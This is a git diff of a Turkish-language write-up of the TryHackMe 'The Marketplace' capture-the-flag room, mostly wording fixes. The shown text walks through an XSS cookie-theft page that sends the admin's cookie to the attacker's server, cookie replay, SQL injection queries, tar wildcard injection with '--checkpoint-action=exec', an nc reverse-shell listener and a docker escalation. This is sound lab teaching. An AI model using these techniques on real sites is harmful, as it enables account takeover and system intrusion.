@@ -1,7 +1,7 @@
 # TR-TheMarketPlace-Writeup
 
 
- Merhabalar bugün sizlerle beraber Tryhackme'de bulunan "The Marketplace" adlı odayı çözümleyeceğiz. Bu yazıyı ayrıntılı yazmak istiyorum çünkü bu oda da kullanacağımız yolların uygulanabilmesi için teori kısmının iyi anlaşılması gerekiyor
+ Merhabalar bugün sizlerle beraber Tryhackme'de bulunan "The Marketplace" adlı odayı çözümleyeceğiz. Bu yazıyı ayrıntılı yazmak istiyorum çünkü bu oda da kullanacağımız yolların uygulanabilmesi için teori kısmının iyi anlaşılması gerekiyor.
 
 ## İhtiyacımız olanlar toolar : 
 - Nmap
@@ -142,15 +142,18 @@ Ve adminlerden cevap geldi. İlanımızda siteyi bozan başı şeyler olduğunu 
 
 >Şimdi işin mantık kısmına gireceğiz. Bana kalırsa aslında hackerlık dediğimiz şey bir bakış açısı. Bir sistemin nasıl çalıştığını anlayıp bunu nasıl kendisi için kullanıcağını akıl edebilmesidir. Şimdi burda nasıl düşünmemiz gerektiğini anlatıcağım.
 
->Ben siteye zararlı bir kod yazabiliyorum ve bu kod çalışıyor. Zararlı kodumu incelemesi için adminlere atabiliyorum. O zaman zararlı kodum görüntülendiği anda adminin bilgisayarında da çalışmaz mı ??
+>Ben siteye zararlı bir kod yazabiliyorum ve bu kod çalışıyor.Daha sonra zararlı kodumun incelemesi için adminlere atabiliyorum. O zaman zararlı kodum görüntülendiği anda adminin bilgisayarında da çalışması gerekmez mi ? Bu anlattığım xss zaafiyetinin mantığıydı, bunu cepte tutun.
 
->Şimdi size çözümü anlatmadan önce çözümün mantığını anlatmak istiyorum. Artık hemen hemen her siteye girdiğimizde Çerez Politikası diye bir pop-up sürekli sağda solda köşede çıkıyor.peki bu çerezler nedir ? 
->aslında çerez dediğimiz şey, bizim sitedeki benzersiz kimliğimiz ( bir nevi tc kimlik numaramız gibi).Sadece bize özel ve her siteye girdiğimizde site bizden bu çerezi alıyor, çözümlüyor ve bizi tanıyor. Bu yüzden siz internette bir laptop baktığınızda sürekli önünüze laptoplarla alakalı reklamlar geliyor. Peki bu çerezler sadece reklam için mi kullanılıyor ? Hayır. Mesela kullanıclara yetki vermek içinde kullanılıyor. adminin çerezi ile normal bir kullacının çerezinde fark olması lazım.
+>Şimdi ise cookie(çerez) mantığını anlamamız lazım. Hemen hemen her siteye girdiğimizde "Çerez Politikası" diye bir pop-up sürekli ekranlarımızda çıkmaya başladı. Peki bu çerezler nedir ? 
+>aslında çerez dediğimiz şey, bizim sitedeki benzersiz kimliğimiz ( bir nevi tc kimlik numaramız gibi ). Sadece bize özel ve her siteye girdiğimizde site bizden bu çerezi alıyor, çözümlüyor ve bizi tanıyor. Bu yüzden siz internette bir laptop baktığınızda sürekli önünüze laptoplarla alakalı reklamlar geliyor. Peki bu çerezler sadece reklam için mi kullanılıyor ? Hayır. Mesela kullanıclara yetki vermek içinde kullanılıyor. adminin çerezi ile normal bir kullacının çerezinde fark olması lazım.
 
->şimdi işimize yarayacak kısımda burası. Ben adminin kullanıcı adı ve şifresini bilmiyorum ve kıramadım. O yüzden "pass to cookie" diye adlandırılan yöntemi kullanarak adminin kullanıcı adını şifresini bilmeden adminin hesabını çalacağım. çok ilginç değil mi ? 
+>Peki siteler bizim cihazlarımızda tutulan bu çerezleri istediği gibi çekebiliyorsa benim zaafiyetli sitem de ziyaretçilerimin çerezlerini çekemez mi ?
 
-şimdi kendimize zaafiyetli bir php sayfası oluşturalım ( yada linkten direk klonlayın [Cookie-stealer](https://github.com/tacticthreat/CookieHeist)
+>Eğer buraya kadar anladıysanız bu çaldığımız çerez ile ne yapıcağımı anlatayım. Ben adminin kullanıcı adı ve şifresini bilmiyorum ve kıramadım. O yüzden "pass to cookie" diye adlandırılan yöntemi kullanarak adminin kullanıcı adını şifresini bilmeden sadece benim siteme yönlendirerek ona ait olan çerezleri çalıcam sonra bu çaldığım çerezi siteye ben adminmişim gibi tanıttığımda adminin hesabına erişmiş olacağım. Ve bütün bunları yaparken adminin kullanıcı adı ve şifresini kullanmamış olacağım. 
 
+Bu mantıktan yola çıkarak kendimize zaafiyetli bir php sayfası oluşturalım. ( yada linkten direk klonlayın [Cookie-stealer](https://github.com/tacticthreat/CookieHeist)
+
+Zaafiyetli php sitesi kodu : 
 ```
 <?php
 $cookie = $_GET['c'];
@@ -160,7 +163,7 @@ fclose($fp);
 ?>
 ```
 
-sonrasında bu php sayfasına diğer makinelerin erişebilmesi için http server olarak yayımlayalım :
+Sonrasında bu php sayfasına diğer makinelerin erişebilmesi için http server olarak ayağa kaldıralım :
 
 ```
 python3 -m http.server 8081
@@ -174,7 +177,7 @@ Hazırlıklar tamam şimdi siteye zararlı kodumuzu yazalım :
 ![cookie_track](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/cookie_track.png)
 
 İlanı yayımladıktan sonra site adminlerinin görmesi için şikayet ediyorum : 
- biraz bekledikten sonra http server açtığımız terminale dönüyorum ve adminin cookilerini çalındığını görüyorum.
+Biraz bekledikten sonra http server açtığımız terminale dönüyorum ve adminin cookilerini çalındığını görüyorum.
  
  ![cookie_steal](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/cookie_steal.jpg)
  
@@ -184,18 +187,19 @@ Hazırlıklar tamam şimdi siteye zararlı kodumuzu yazalım :
 
 Cookie sahibi michael adında bir admin kullanıcısına ait. O zaman bu cookie ile giriş yapalım.
 
-f12 tuşuna basın yada siteye sağ tıklayıp geliştirici seçeneklerini açın sonrasında storage kısmında cookie sekmesini açın.
+>f12 tuşuna basın yada siteye sağ tıklayıp geliştirici seçeneklerini açın sonrasında storage kısmında cookie sekmesini açın.
 
 Value değerini çaldığımız cookie ile değiştirip sayfayı yenileyin ( f5 ).
 
 ![cookie_change](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/Log%20in%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%204.09.2022%2017_37_40.png)
 
+Artık adminiz.
 
-Admin panelinde ilk flag'ımızı buluyoruz.
+Ve admin paneline girdiğimizde ilk flag'ımızı buluyoruz.
 
 ![ilk_flag](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/ilk_flag.jpg)
 
-Karşımıza çıkan 4 kişiden birine girin ve url e bakın
+Karşımıza çıkan 4 kişiden birine tıklayın ve url e bakın
 
 ![sql_detect](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/sql_detect.png)
 
@@ -222,7 +226,7 @@ ADIM 7 : /admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 fro
 
 ![secret_message](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/secret%20message.png)
 
-Burda bize jake kullanısının eski ssh şifresinin çok güçsüz olduğunu(kolay kırılabilen) söylüyor. Bu yüzden de sistem tarafından otomatik olarak daha güçlü bir şifre oluşturulduğunu ve bu şifreyi e posta ile gönderdiğini görüyoruz.
+Burda bize jake kullanısının eski ssh şifresinin çok güçsüz(kolay kırılabilen) olduğunu söylüyor. Bu yüzden de sistem tarafından otomatik olarak daha güçlü bir şifre oluşturulduğunu ve bu şifreyi de posta ile gönderdiğini görüyoruz.
 
 Bu demek oluyor ki artık sisteme ssh bağlantısı alıp rahat rahat kod yazabileceğiz
 
@@ -230,7 +234,7 @@ Bu demek oluyor ki artık sisteme ssh bağlantısı alıp rahat rahat kod yazabi
 ```
 ssh jake@hedef_ip 
 ```
-Şifreyi girin.
+E-postadan öğrendiğimiz şifreyi girin.
 
 ![jake_ssh](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/jake_ssh.png)
 
@@ -244,7 +248,7 @@ sudo -l
 ![sudo](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/sudo%20priv.png)
 
 
-Michael yetkileriyle çalışan bir .sh dosyası var.Eğer bu dosyayı sömürebilirsek michael adına shell alabiliriz.
+Michael yetkileriyle çalışan bir .sh dosyası var. Eğer bu dosyayı sömürebilirsek michael adına shell alabiliriz.
 
 ![backup](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/backup_ls.png)
 
@@ -261,19 +265,19 @@ jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"
 jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
 jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
 ```
-Çalıştırmadan önce kendi terminalinizde nc listener açın : 
+Çalıştırmadan önce kendi terminalinizde "nc listener" açın : 
 
 ```
 melami㉿Melami> nc -lvnp 4444
 ```
 ![nc](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/nc.png)
 
-Tekrar Ssh bağlantısına geri dönün.Kodu çalıştırmadan önce backup.tar dosyasını silin.
+Tekrar ssh bağlantısına geri dönün. Kodu çalıştırmadan önce backup.tar dosyasını silin.
 ```
 rm backup.tar
 sudo -u michael /opt/backups/backup.sh
 ```
-Michael adına reverse shell alabildik
+Michael adına reverse shell alabildik.
 
 ![michael](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/micheal%20shell.png)
 
@@ -288,7 +292,7 @@ Docker imaj listesi için:
 
 ![docker](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/docker%20list.png)
 
-alpine üzerinden yetki yükseltebiliriz.
+"alpine" üzerinden yetki yükseltebiliriz.
 
 ![gftobins](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/gftobins-docker.png)
 
